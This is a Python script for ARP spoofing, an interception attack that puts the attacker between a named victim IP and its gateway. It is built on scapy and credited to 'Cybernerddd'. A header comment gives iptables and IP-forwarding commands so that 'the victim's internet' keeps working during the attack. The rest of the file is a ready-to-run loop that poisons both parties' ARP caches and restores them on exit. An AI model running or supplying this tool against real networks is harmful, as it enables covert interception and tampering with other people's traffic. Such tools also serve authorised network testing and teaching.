#!/usr/bin/env python

# Before starting the ARP spoof, ensure IP forwarding is enabled and
# configure iptables to forward and masquerade packets from the victim.
# This allows the spoofed packets to reach the actual router and
# keeps the victim's internet working during the attack.
#
# Commands to run:
# echo 1 > /proc/sys/net/ipv4/ip_forward
# sudo iptables --flush
# sudo iptables -t nat --flush
# iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

 
#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import argparse
import os

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=2, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        print(f"[!] No response from {ip}. MAC address not found.")
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    if not dst_mac or not src_mac:
        return
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)
    print(f"[+] Restored ARP table for {dst_ip} and {src_ip}")

def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool by Cybernerddd")
    parser.add_argument("-t", "--target", required=True, help="Target IP address (victim)")
    parser.add_argument("-g", "--gateway", required=True, help="Default Gateway IP")
    args = parser.parse_args()

    enable_ip_forwarding()

    print(f"[*] Starting ARP spoofing on {args.target} <-> {args.gateway}")
    packet_count = 0
    try:
        while True:
            spoof(args.target, args.gateway)
            spoof(args.gateway, args.target)
            packet_count += 2
            print(f"\r[+] Sent Packets: {packet_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] CTRL+C detected. Restoring ARP tables...")
        restore(args.target, args.gateway)
        restore(args.gateway, args.target)
        print("[+] ARP spoofing stopped and targets restored.")

if __name__ == "__main__":
    main()
